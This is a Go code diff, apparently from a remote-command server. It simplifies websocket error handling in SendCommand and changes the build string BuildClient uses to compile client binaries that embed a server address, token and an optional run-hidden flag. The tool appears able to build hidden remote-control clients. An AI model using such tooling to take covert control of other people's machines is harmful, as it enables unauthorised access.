@@ -86,19 +86,13 @@ func (c clientService) SendCommand(ctx context.Context, input SendCommandInput) 
 	}
 
 	err = client.WriteMessage(websocket.BinaryMessage, requestMessage)
-	switch {
-	case websocket.IsCloseError(err), websocket.IsUnexpectedCloseError(err):
+	if err != nil {
 		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
-	case err != nil:
-		return SendCommandOutput{}, err
 	}
 
 	_, responseMessage, err := client.ReadMessage()
-	switch {
-	case websocket.IsCloseError(err), websocket.IsUnexpectedCloseError(err):
+	if err != nil {
 		return SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}, nil
-	case err != nil:
-		return SendCommandOutput{}, err
 	}
 
 	var response request.RespondCommandRequestBody
@@ -156,10 +150,10 @@ func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error)
 		return "", err
 	}
 
-	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.HttpPort=%s -X main.WebSocketPort=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
+	const buildStr = `GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags '%s -s -w -X main.Version=%s -X main.Port=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags "-static"' -o ../temp/%s main.go`
 
 	filename = buildFilename(input.OSTarget, filename)
-	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, c.configuration.Server.Port, input.ServerPort, input.ServerAddress, newToken, filename)
+	buildCmd := fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)
 
 	cmd := exec.Command("sh", "-c", buildCmd)
 	cmd.Dir = "client/"
